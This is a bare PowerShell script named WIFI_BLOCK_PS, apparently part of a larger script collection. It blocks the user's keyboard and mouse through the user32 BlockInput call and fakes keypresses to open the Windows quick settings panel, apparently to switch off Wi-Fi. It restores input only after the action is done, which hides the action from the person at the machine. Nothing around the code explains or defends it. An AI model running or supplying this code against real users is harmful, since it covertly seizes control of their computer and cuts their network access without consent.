SCRIPTS.WIFI_BLOCK_PS:
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class InputBlocker {
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        public const int VK_LWIN=0x5B; public const int VK_A=0x41; public const int VK_RETURN=0x0D; public const int VK_ESCAPE=0x1B; public const uint KEYEVENTF_KEYUP=0x0002;
    }
"@
try {
    [InputBlocker]::BlockInput($true); Start-Sleep -Milliseconds 200
    [InputBlocker]::keybd_event([InputBlocker]::VK_LWIN,0,0,[UIntPtr]::Zero)
    [InputBlocker]::keybd_event([InputBlocker]::VK_A,0,0,[UIntPtr]::Zero)
    Start-Sleep -Milliseconds 50
    [InputBlocker]::keybd_event([InputBlocker]::VK_A,0,[InputBlocker]::KEYEVENTF_KEYUP,[UIntPtr]::Zero)
    [InputBlocker]::keybd_event([InputBlocker]::VK_LWIN,0,[InputBlocker]::KEYEVENTF_KEYUP,[UIntPtr]::Zero)
    Start-Sleep -Milliseconds 800
    [InputBlocker]::keybd_event([InputBlocker]::VK_RETURN,0,0,[UIntPtr]::Zero); Start-Sleep -Milliseconds 50
    [InputBlocker]::keybd_event([InputBlocker]::VK_RETURN,0,[InputBlocker]::KEYEVENTF_KEYUP,[UIntPtr]::Zero); Start-Sleep -Milliseconds 300
    [InputBlocker]::keybd_event([InputBlocker]::VK_ESCAPE,0,0,[UIntPtr]::Zero); Start-Sleep -Milliseconds 50
    [InputBlocker]::keybd_event([InputBlocker]::VK_ESCAPE,0,[InputBlocker]::KEYEVENTF_KEYUP,[UIntPtr]::Zero); Start-Sleep -Milliseconds 200
} finally { [InputBlocker]::BlockInput($false) }

